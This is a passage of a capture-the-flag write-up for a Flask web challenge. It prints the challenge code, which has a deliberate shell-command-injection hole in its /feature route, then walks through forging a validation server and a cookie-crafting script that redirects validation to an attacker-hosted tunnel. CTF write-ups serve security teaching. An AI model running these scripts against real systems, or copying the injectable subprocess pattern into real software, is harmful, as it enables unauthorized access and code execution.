</span></span><span class=line><span class=cl>    <span class=c1># have to go here</span>
</span></span><span class=line><span class=cl>    <span class=n>validation_server</span> <span class=o>=</span> <span class=n>DEFAULT_VALIDATION_SERVER</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;debug&#39;</span><span class=p>)</span> <span class=o>==</span> <span class=s1>&#39;true&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>preferences</span><span class=p>,</span> <span class=n>_</span> <span class=o>=</span> <span class=n>get_preferences</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>validation_server</span> <span class=o>=</span> <span class=n>preferences</span><span class=o>.</span><span class=n>get</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;validation_server&#39;</span><span class=p>,</span> <span class=n>DEFAULT_VALIDATION_SERVER</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>validate_server</span><span class=p>(</span><span class=n>validation_server</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>make_response</span><span class=p>(</span><span class=n>render_template</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;release.html&#39;</span><span class=p>,</span> <span class=n>feature_unlocked</span><span class=o>=</span><span class=kc>True</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=c1># token has our desired access_granted dumped</span>
</span></span><span class=line><span class=cl>        <span class=n>token</span> <span class=o>=</span> <span class=n>serializer</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=s1>&#39;access_granted&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span><span class=o>.</span><span class=n>set_cookie</span><span class=p>(</span><span class=s1>&#39;access_token&#39;</span><span class=p>,</span> <span class=n>token</span><span class=p>,</span> <span class=n>httponly</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>secure</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># feature unlocked</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>response</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;release.html&#39;</span><span class=p>,</span> <span class=n>feature_unlocked</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>release_timestamp</span><span class=o>=</span><span class=n>NEW_FEATURE_RELEASE</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/feature&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>feature</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>token</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;access_token&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>token</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;index&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>serializer</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>data</span> <span class=o>!=</span> <span class=s1>&#39;access_granted&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;index&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># get the text from body</span>
</span></span><span class=line><span class=cl>            <span class=n>to_process</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;text&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=c1># RCE here</span>
</span></span><span class=line><span class=cl>                <span class=n>word_count</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;echo </span><span class=si>{</span><span class=n>to_process</span><span class=si>}</span><span class=s2> | wc -w&#34;</span>
</span></span><span class=line><span class=cl>                <span class=n>output</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>check_output</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                    <span class=n>word_count</span><span class=p>,</span> <span class=n>shell</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>text</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>CalledProcessError</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>output</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;Error: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;feature.html&#39;</span><span class=p>,</span> <span class=n>output</span><span class=o>=</span><span class=n>output</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;feature.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Error: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;index&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_pubkey</span><span class=p>(</span><span class=n>validation_server</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>validation_server</span><span class=si>}</span><span class=s2>/pubkey&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span><span class=o>.</span><span class=n>raise_for_status</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>ECC</span><span class=o>.</span><span class=n>import_key</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>RequestException</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>Exception</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=sa>f</span><span class=s2>&#34;Error connecting to validation server for public key: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>validate_access</span><span class=p>(</span><span class=n>validation_server</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pubkey</span> <span class=o>=</span> <span class=n>get_pubkey</span><span class=p>(</span><span class=n>validation_server</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>validation_server</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span><span class=o>.</span><span class=n>raise_for_status</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>date</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=s1>&#39;date&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>signature</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=s1>&#39;signature&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>verifier</span> <span class=o>=</span> <span class=n>DSS</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>pubkey</span><span class=p>,</span> <span class=s1>&#39;fips-186-3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>verifier</span><span class=o>.</span><span class=n>verify</span><span class=p>(</span><span class=n>SHA256</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>date</span><span class=p>),</span> <span class=n>signature</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>date</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>RequestException</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>Exception</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Error validating access: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>validate_server</span><span class=p>(</span><span class=n>validation_server</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>date</span> <span class=o>=</span> <span class=n>validate_access</span><span class=p>(</span><span class=n>validation_server</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>date</span> <span class=o>&gt;=</span> <span class=n>NEW_FEATURE_RELEASE</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Error: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>1337</span><span class=p>)</span>
</span></span></code></pre></div><p>This Flask application manages feature access using a cookie-based token system. Users accessing the <code>/release</code> route may receive an access token if they are validated by a server. If the server&rsquo;s public key verifies a valid date, the feature is unlocked, and the token is set. The <code>/feature</code> route allows text processing with potential <strong>Remote Code Execution (RCE)</strong> via a subprocess command. It also fetches a public key and verifies server access using digital signatures. The application defaults to a basic theme and language in user preferences, which can be updated based on cookies.</p><p>Interesting, the server uses the validation server hosted on <code>localhost</code> port <code>1338</code>
to validate the access. Let&rsquo;s check how this latter is implemented:</p><h3 id=validationpy><code>validation.py</code><a hidden class=anchor aria-hidden=true href=#validationpy>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>jsonify</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Hash</span> <span class=kn>import</span> <span class=n>SHA256</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.PublicKey</span> <span class=kn>import</span> <span class=n>ECC</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Signature</span> <span class=kn>import</span> <span class=n>DSS</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>ECC</span><span class=o>.</span><span class=n>generate</span><span class=p>(</span><span class=n>curve</span><span class=o>=</span><span class=s1>&#39;p256&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pubkey</span> <span class=o>=</span> <span class=n>key</span><span class=o>.</span><span class=n>public_key</span><span class=p>()</span><span class=o>.</span><span class=n>export_key</span><span class=p>(</span><span class=nb>format</span><span class=o>=</span><span class=s1>&#39;PEM&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/pubkey&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_pubkey</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>pubkey</span><span class=p>,</span> <span class=mi>200</span><span class=p>,</span> <span class=p>{</span><span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;text/plain; charset=utf-8&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>date</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()))</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span> <span class=o>=</span> <span class=n>SHA256</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>date</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>signature</span> <span class=o>=</span> <span class=n>DSS</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=s1>&#39;fips-186-3&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>sign</span><span class=p>(</span><span class=n>h</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;date&#39;</span><span class=p>:</span> <span class=n>date</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;signature&#39;</span><span class=p>:</span> <span class=n>signature</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;127.0.0.1&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>1338</span><span class=p>)</span>
</span></span></code></pre></div><p>In simple terms, this validation server helps the main application check if it should unlock features. It does this by providing a way to verify if a timestamp given by the server is genuine. When the main application asks the server, it gets a timestamp and a special code showing it’s real. The main application then uses this code to confirm that the server&rsquo;s timestamp is valid before unlocking any features.</p><p>In more technical terms, the validation server returns a date which is later compared
to the NEW_FEATURE_RELEASE date, if the date given by the validation server is greater than
the latter, the feature is unlocked (access_granted set, by extension we get RCE)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># validate server function</span>
</span></span><span class=line><span class=cl><span class=n>date</span> <span class=o>=</span> <span class=n>validate_access</span><span class=p>(</span><span class=n>validation_server</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=n>date</span> <span class=o>&gt;=</span> <span class=n>NEW_FEATURE_RELEASE</span>
</span></span></code></pre></div><p>However, the server used by the application currently doesn&rsquo;t serve us well. Only if we could redirect the application onto a server of our own&mldr;</p><hr><p>It turns out, when the <code>debug</code> query parameter is set to <code>true</code> in the <code>/release</code> route, the application allows overriding the default validation server with one specified in the user&rsquo;s cookie preferences. If the custom server is validated successfully, it may issue an access token granting feature access. This setup could potentially be exploited if the custom validation server is not securely configured.</p><p>This is exactly what we want, we can host our own server which instead of returning
the current date, it returns a date greater that NEW_FEATURE_RELEASE. After that,
we can send a POST request to <code>/feature</code> with text equal to our payload which retrieves
the flag.txt file.</p><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>Let&rsquo;s first write our own <code>custom-validation.py</code> server, host it and tunnel our localhost using <code>beeceptor</code></p><h3 id=custom-validationpy><code>custom-validation.py</code><a hidden class=anchor aria-hidden=true href=#custom-validationpy>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>jsonify</span><span class=p>,</span> <span class=n>request</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Hash</span> <span class=kn>import</span> <span class=n>SHA256</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.PublicKey</span> <span class=kn>import</span> <span class=n>ECC</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Signature</span> <span class=kn>import</span> <span class=n>DSS</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Generate a key and public key</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>ECC</span><span class=o>.</span><span class=n>generate</span><span class=p>(</span><span class=n>curve</span><span class=o>=</span><span class=s1>&#39;p256&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pubkey</span> <span class=o>=</span> <span class=n>key</span><span class=o>.</span><span class=n>public_key</span><span class=p>()</span><span class=o>.</span><span class=n>export_key</span><span class=p>(</span><span class=nb>format</span><span class=o>=</span><span class=s1>&#39;PEM&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Constants</span>
</span></span><span class=line><span class=cl><span class=n>DEFAULT_VALIDATION_SERVER</span> <span class=o>=</span> <span class=s1>&#39;http://127.0.0.1:1338&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/pubkey&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_pubkey</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>pubkey</span><span class=p>,</span> <span class=mi>200</span><span class=p>,</span> <span class=p>{</span><span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;text/plain; charset=utf-8&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>date</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()))</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span> <span class=o>=</span> <span class=n>SHA256</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>date</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>signature</span> <span class=o>=</span> <span class=n>DSS</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=s1>&#39;fips-186-3&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>sign</span><span class=p>(</span><span class=n>h</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Bypass validation by always returning a valid date and signature</span>
</span></span><span class=line><span class=cl>    <span class=c1># Ensure the date is in the future to always pass the validation</span>
</span></span><span class=line><span class=cl>    <span class=n>valid_date</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>())</span> <span class=o>+</span> <span class=mi>10</span> <span class=o>*</span> <span class=mi>24</span> <span class=o>*</span> <span class=mi>60</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>  <span class=c1># Valid for 10 days in the future</span>
</span></span><span class=line><span class=cl>    <span class=n>valid_signature</span> <span class=o>=</span> <span class=n>DSS</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=s1>&#39;fips-186-3&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>sign</span><span class=p>(</span><span class=n>SHA256</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>valid_date</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;date&#39;</span><span class=p>:</span> <span class=n>valid_date</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;signature&#39;</span><span class=p>:</span> <span class=n>valid_signature</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;127.0.0.1&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>1338</span><span class=p>)</span>
</span></span></code></pre></div><p>This here always returns a valid date. Let&rsquo;s now create our <code>gen.py</code> script to get the acess_granted cookie.</p><h3 id=genpy><code>gen.py</code><a hidden class=anchor aria-hidden=true href=#genpy>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Configuration</span>
</span></span><span class=line><span class=cl><span class=n>BASE_URL</span> <span class=o>=</span> <span class=s1>&#39;https://feature-unlocked-web.challs.csc.tf&#39;</span>
</span></span><span class=line><span class=cl><span class=n>RELEASE_ENDPOINT</span> <span class=o>=</span> <span class=s1>&#39;/release&#39;</span>
</span></span><span class=line><span class=cl><span class=n>PREFERENCES_COOKIE_NAME</span> <span class=o>=</span> <span class=s1>&#39;preferences&#39;</span>
</span></span><span class=line><span class=cl><span class=n>DEFAULT_PREFERENCES</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;theme&#39;</span><span class=p>:</span> <span class=s1>&#39;light&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;language&#39;</span><span class=p>:</span> <span class=s1>&#39;en&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;validation_server&#39;</span><span class=p>:</span> <span class=s1>&#39;https://&lt;id&gt;.free.beeceptor.com&#39;</span>  <span class=c1># This should match the modified validation server URL</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Encode preferences as base64</span>
</span></span><span class=line><span class=cl><span class=n>encoded_preferences</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>DEFAULT_PREFERENCES</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set the preferences cookie value</span>
</span></span><span class=line><span class=cl><span class=n>cookies</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>PREFERENCES_COOKIE_NAME</span><span class=p>:</span> <span class=n>encoded_preferences</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Make the GET request to /release with debug=true</span>
</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>BASE_URL</span><span class=si>}{</span><span class=n>RELEASE_ENDPOINT</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;debug&#39;</span><span class=p>:</span> <span class=s1>&#39;true&#39;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>allow_redirects</span><span class=o>=</span><span class=kc>False</span>  <span class=c1># Avoid following redirects to see the response directly</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Print the response</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Status Code: </span><span class=si>{</span><span class=n>response</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Response Headers: </span><span class=si>{</span><span class=n>response</span><span class=o>.</span><span class=n>headers</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
